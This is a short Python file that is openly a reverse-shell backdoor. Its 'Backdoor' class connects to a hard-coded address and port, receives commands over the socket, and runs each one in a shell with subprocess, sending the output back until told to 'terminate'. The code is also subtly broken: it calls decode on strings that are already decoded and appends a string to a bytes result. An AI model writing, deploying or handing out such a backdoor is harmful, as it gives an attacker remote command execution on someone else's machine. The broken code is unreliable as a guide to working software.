import socket,subprocess

class Backdoor:

    def __init__(self, IP, PORT):
        self.conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.conn.connect((IP,PORT))

    def exec_cmd(self, cmd):
        try:
            result = subprocess.check_output(cmd.decode(),shell=True,stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        except Exception as e:
            result = "[-] Something went wrong !"
        return (result+"done")
    
    def r_send(self, msg):
        print(msg)
        self.conn.send(msg.strip())

    def r_recv(self):
        return self.conn.recv(1024).decode()

    def run(self):
        while(True):
            cmd = self.r_recv()
            if cmd.decode() == "terminate":
                self.conn.close()
                exit()
            result = self.exec_cmd(cmd)
            self.r_send(result)


backdoor = Backdoor("127.0.0.1",2000)
backdoor.run()